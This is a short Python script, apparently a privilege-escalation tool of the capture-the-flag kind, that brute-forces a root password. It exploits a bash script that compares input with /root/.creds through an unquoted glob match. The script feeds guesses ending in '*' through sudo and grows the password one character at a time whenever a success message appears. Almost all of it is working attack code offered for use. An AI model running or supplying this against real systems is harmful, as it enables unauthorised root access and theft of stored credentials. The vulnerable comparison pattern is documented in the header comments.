print("""\
┏┳┓          ┏┓         
 ┃ ┏┓┏┏┏┓┏┓━━┃┓┏┓┏┓┏┓┏┓┏
 ┻ ┗ ┛┛┗ ┛   ┗┛┗┻┛ ┗┻┛┗┻                        
               """)



##Python exploit to brute force on SH files.
##Work for scripts that the passwd are on a variable. It can be configure by changing the file route and changing the original succed output.
##Here's an example:-----------------------------##########

#!/bin/bash
##DB_USER="root"<-- Root pwd store on a variables... Plain text
##DB_PASS=$(/usr/bin/cat /root/.creds)
##BACKUP_DIR="/var/backups/mysql"

##read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
##/usr/bin/echo

##if [[ $DB_PASS == $USER_PASS ]]; then <-- "==" means compare character by character. Brute force vulnerable.
       ## /usr/bin/echo "Password confirmed!" <--Output confirm the pwds match. 

##-----------------------------------------------##########


import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
dir = input("Enter the directory and file name:")
inp = input("Enter succeed message without quotation marks:")
found = False
print("Starting atack.")

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo {dir}" ##Route to change
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
##Output to change
        if inp in output:
            password += character
            print(password)
            break
    else:
        print("This is your password:", password)
        found = True
        
